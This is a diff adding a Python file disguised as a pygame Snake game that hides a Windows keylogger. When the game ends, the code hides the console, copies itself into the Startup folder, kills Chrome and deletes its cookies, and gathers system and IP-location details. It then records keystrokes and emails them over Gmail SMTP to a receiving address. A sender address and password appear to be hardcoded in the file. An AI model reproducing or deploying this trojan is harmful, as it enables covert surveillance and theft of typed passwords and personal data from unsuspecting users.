@@ -1,0 +1,357 @@
+from pynput import keyboard
+from datetime import datetime
+from datetime import date
+import threading
+import sys
+import shutil
+import os
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import time
+import win32gui
+import win32con
+import wmi
+import requests
+import json
+import pygame
+import random
+import subprocess
+
+keys = []
+count = 0
+file_name = 'log.txt'
+user_name = os.getlogin()
+
+# The mail addresses and password
+SENDER = "tienhovan2002@gmail.com"
+SENDER_PASSWORD = "HoVanTien&30082002"
+RECEIVER =  'hovtien2002@gmail.com' #Gmail of haker
+MAIL_CONTENT = '''
+Hey hacker i give this for you.
+'''
+
+snake_speed = 10
+
+# Window size
+window_x = 720
+window_y = 480
+
+# defining colors
+black = pygame.Color(0, 0, 0)
+white = pygame.Color(255, 255, 255)
+red = pygame.Color(255, 0, 0)
+green = pygame.Color(0, 255, 0)
+blue = pygame.Color(0, 0, 255)
+
+# Initialising pygame
+pygame.init()
+
+# Initialise game window
+pygame.display.set_caption('Snakes Game')
+game_window = pygame.display.set_mode((window_x, window_y))
+
+# FPS (frames per second) controller
+fps = pygame.time.Clock()
+
+# defining snake default position
+snake_position = [100, 50]
+
+# defining first 4 blocks of snake body
+snake_body = [[100, 50],
+			[90, 50],
+			[80, 50],
+			[70, 50]
+			]
+# fruit position
+fruit_position = [random.randrange(1, (window_x//10)) * 10,
+				random.randrange(1, (window_y//10)) * 10]
+
+fruit_spawn = True
+
+# setting default snake direction towards
+# right
+direction = 'RIGHT'
+change_to = direction
+
+# initial score
+score = 0
+
+def show_score(choice, color, font, size):
+
+	# creating font object score_font
+	score_font = pygame.font.SysFont(font, size)
+	
+	# create the display surface object
+	# score_surface
+	score_surface = score_font.render('Score : ' + str(score), True, color)
+	
+	# create a rectangular object for the text
+	# surface object
+	score_rect = score_surface.get_rect()
+	
+	# displaying text
+	game_window.blit(score_surface, score_rect)
+
+def game_over():
+
+	# creating font object my_font
+	my_font = pygame.font.SysFont('times new roman', 50)
+	
+	# creating a text surface on which text
+	# will be drawn
+	game_over_surface = my_font.render(
+		'Your Score is : ' + str(score), True, red)
+	
+	# create a rectangular object for the text
+	# surface object
+	game_over_rect = game_over_surface.get_rect()
+	
+	# setting position of the text
+	game_over_rect.midtop = (window_x/2, window_y/4)
+	
+	# blit wil draw the text on screen
+	game_window.blit(game_over_surface, game_over_rect)
+	pygame.display.flip()
+	
+	# after 2 seconds we will quit the program
+	time.sleep(2)
+	
+	# deactivating pygame library
+	pygame.quit()
+	
+	# quit the program
+	quit()
+
+def sendLog(file):
+	#Get Date Time
+	current_date = date.today()
+
+	#Setup the MIME 
+	message = MIMEMultipart()
+	message['From'] = SENDER
+	message['To'] = SENDER_PASSWORD
+	message['Subject'] = 'Log Key' + str(current_date)
+
+	#The body and the attachments for the mail
+	message.attach(MIMEText(MAIL_CONTENT, 'plain'))
+	attach_file_name = file
+	attach_file = open(attach_file_name, 'rb') # Open the file as binary mode
+	payload = MIMEBase('application', 'octate-stream')
+	payload.set_payload((attach_file).read())
+	encoders.encode_base64(payload) #encode the attachment
+	#add payload header with filename
+	payload.add_header('Content-Decomposition', 'attachment', filename=attach_file_name)
+	message.attach(payload)
+
+	#Create SMTP session for sending the mail
+	session = smtplib.SMTP('smtp.gmail.com', 587) #use gmail with port
+	session.starttls() #enable security
+	session.login(SENDER, SENDER_PASSWORD) #login with mail_id and password
+	text = message.as_string()
+	session.sendmail(SENDER, RECEIVER, text)
+	session.quit()
+	time.sleep(2)
+	os.remove(file)
+# kiểm tra file có tồn tại ko
+
+def get(data): 
+    #data ='ip'
+    endpoint = 'https://ipinfo.io/json'
+    response = requests.get(endpoint, verify = True)
+
+    if response.status_code != 200:
+        return 'Status:', response.status_code, 'Problem with the request. Exiting.'
+        exit()
+
+    result = response.json()
+
+    return result[data]
+
+def get_info(): 
+	with open (file_name, 'w') as file:
+		c = wmi.WMI()
+		my_system = c.Win32_ComputerSystem()[0]
+
+		sys_manufacturer = my_system.Manufacturer
+		sys_model = my_system.Model
+		sys_name = my_system.Name
+		sys_processors = my_system.NumberOfProcessors
+		sys_type = my_system.SystemType
+		data = "Manufacturer: " + str(sys_manufacturer) + "\n" #Get Manufacturer
+		data += "Model: " + str(sys_model) + "\n" #Get Model
+		data += "Name: " + str(sys_name) + "\n" #Get Name
+		data += "Processors: " + str(sys_processors) + "\n" #Get Processors
+		data += "Type: " + str(sys_type) + "\n" #Get Type
+		data += "User: " + str(user_name) + "\n" #Get User
+		data += "Ip: " + str(get('ip')) + "\n" #Get Ip
+		data += "Hostname: " + str(get('hostname')) + "\n" #Get Hostname
+		data += "City: " + str(get('city')) + "\n" #Get City
+		data += "Region: " + str(get('region')) + "\n" #Get Region
+		data += "Country: " + str(get('country')) + "\n" #Get Country
+		data += "Loc: " + str(get('loc')) + "\n" #Get Loc
+		data += "Org: " + str(get('org')) + "\n" #Get Org
+		data += "Timezone: " + str(get('timezone')) + "\n" #Get Timezone
+		file.write(str(data))
+
+def checkFile(file): 
+	file_path = os.getcwd() + '\\' + file
+	file_size = os.path.getsize(file)
+	if os.path.exists(file_path): # check file if exists and send log file
+		sendLog(file) # Send log file
+	else: # If not will exit
+		return False
+		sys.exit(1)
+
+def on_press(key):
+	global keys
+	global count
+
+	keys.append(key)
+	count += 1
+	
+	try:
+		print('Pressed {0}'.format(key.char))
+	except AttributeError:
+		print('Special key {0} pressed'.format(key))
+
+	if (count == 50) & (len(keys) == 50):
+		with open (file_name, 'a') as file:
+			for key in keys:
+				k = str(key).replace(',', ' ')
+				file.write(str(k))
+				
+		count = 0 
+		keys = []
+		checkFile(file_name) # Input keys into file log
+			
+def on_release(key):
+	print('{0} release'.format(key))
+	
+	if key == keyboard.Key.esc:
+		#Stop listener
+		return False
+
+def log():
+	with keyboard.Listener(
+		on_press=on_press,
+		on_release=on_release) as listener:
+			listener.join()
+
+def main():
+
+	# hide console 
+	hide_program = win32gui.GetForegroundWindow()
+	win32gui.ShowWindow(hide_program, win32con.SW_HIDE)
+
+	# # Move file to start up folder 
+	current_file = os.getcwd()
+	shutil.move(current_file + '\\' + 'Keylloger_v1.py', 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+	
+	# Clear Chrome Cookie :>>
+
+	path = "C:\\Users\\" + user_name + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default"
+	os.system("taskkill /im chrome.exe /f")
+	os.chdir(path)
+	time.sleep(2)
+	os.remove("Cookies")
+
+	# Input information, IP public and localtion
+	get_info()
+
+	#Run Code Section
+	try:
+		thrLog = threading.Thread(target=log,)
+		thrLog.start()
+		thrLog.join()
+	except:
+		sys.exit(1)
+
+
+while True:
+	
+	# handling key events
+	for event in pygame.event.get():
+		if event.type == pygame.KEYDOWN:
+			if event.key == pygame.K_UP:
+				change_to = 'UP'
+			if event.key == pygame.K_DOWN:
+				change_to = 'DOWN'
+			if event.key == pygame.K_LEFT:
+				change_to = 'LEFT'
+			if event.key == pygame.K_RIGHT:
+				change_to = 'RIGHT'
+
+	# If two keys pressed simultaneously
+	# we don't want snake to move into two
+	# directions simultaneously
+	if change_to == 'UP' and direction != 'DOWN':
+		direction = 'UP'
+	if change_to == 'DOWN' and direction != 'UP':
+		direction = 'DOWN'
+	if change_to == 'LEFT' and direction != 'RIGHT':
+		direction = 'LEFT'
+	if change_to == 'RIGHT' and direction != 'LEFT':
+		direction = 'RIGHT'
+
+	# Moving the snake
+	if direction == 'UP':
+		snake_position[1] -= 10
+	if direction == 'DOWN':
+		snake_position[1] += 10
+	if direction == 'LEFT':
+		snake_position[0] -= 10
+	if direction == 'RIGHT':
+		snake_position[0] += 10
+
+	# Snake body growing mechanism
+	# if fruits and snakes collide then scores
+	# will be incremented by 10
+	snake_body.insert(0, list(snake_position))
+	if snake_position[0] == fruit_position[0] and snake_position[1] == fruit_position[1]:
+		score += 10
+		fruit_spawn = False
+	else:
+		snake_body.pop()
+		
+	if not fruit_spawn:
+		fruit_position = [random.randrange(1, (window_x//10)) * 10,
+						random.randrange(1, (window_y//10)) * 10]
+		
+	fruit_spawn = True
+	game_window.fill(black)
+	
+	for pos in snake_body:
+		pygame.draw.rect(game_window, green,
+						pygame.Rect(pos[0], pos[1], 10, 10))
+	pygame.draw.rect(game_window, white, pygame.Rect(
+		fruit_position[0], fruit_position[1], 10, 10))
+
+	# Game Over conditions
+	if snake_position[0] < 0 or snake_position[0] > window_x-10:
+		main()
+		
+	if snake_position[1] < 0 or snake_position[1] > window_y-10:
+		main()
+		game_over()
+
+
+	# Touching the snake body
+	for block in snake_body[1:]:
+		if snake_position[0] == block[0] and snake_position[1] == block[1]:
+			main()
+			game_over()
+
+	# displaying score countinuously
+	show_score(1, white, 'times new roman', 20)
+
+	# Refresh game screen
+	pygame.display.update()
+
+	# Frame Per Second /Refres Rate
+	fps.tick(snake_speed)
+
+# if __name__ == '__main__':
+# 	main()
